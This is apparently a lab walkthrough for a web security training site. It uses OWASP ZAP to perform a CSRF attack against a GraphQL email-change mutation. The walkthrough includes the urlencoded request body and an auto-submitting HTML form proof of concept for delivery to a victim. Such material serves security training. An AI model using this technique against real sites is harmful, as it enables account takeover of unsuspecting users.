# Lab: Performing CSRF exploits over GraphQL [OWASP Zed Attack Proxy]

Access the lab in ZAP's browser and log in with credentials `wiener:peter`. Update your email and check __History__ tab in ZAP for the latest `POST /graphql/v1` request. This should be the request body:

```json
{"query":"\n    mutation changeEmail($input: ChangeEmailInput!) {\n        changeEmail(input: $input) {\n            email\n        }\n    }\n","operationName":"changeEmail","variables":{"input":{"email":"attacker@fakemail.com"}}}
```

Right-click the request and select "Open in Requester Tab". Use the Method dropdown under the Request panel and switch to `GET` and then back to `POST`. Notice that `Content-Type: x-www-form-urlencoded` appeared in the headers. But the request body that is present is no longer necessary, change it with the following:

```
query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
```

In the above request body or __query__ there are three parameters with values. Go to __Tools__ > __Encode/Decode/Hash__ to URL decode each of the values and then encode as HTML. 

> NOTE: change the email before encoding the value of __`variables`__ as HTML!

Now place the resulting HTML encoded strings in the `<input value="">` attributes next to their parameter names, respectively:

```html
<html>
  <form action="https://YOUR-LAB-ID.web-security-academy.net/graphql/v1" method="POST">
    <input type="hidden" name="query" value="YOUR-HTML-ENCODED-STRING" />
    <input type="hidden" name="operationName" value="YOUR-HTML-ENCODED-STRING" />
    <input type="hidden" name="variables" value="YOUR-HTML-ENCODED-STRING" />
  </form>
  <script>
    document.forms[0].submit();
  </script>
</html>
```

Go to the __exploit server__ and paste the above CSRF PoC in the "Body" input. Click "Deliver exploit to victim" to solve the lab.


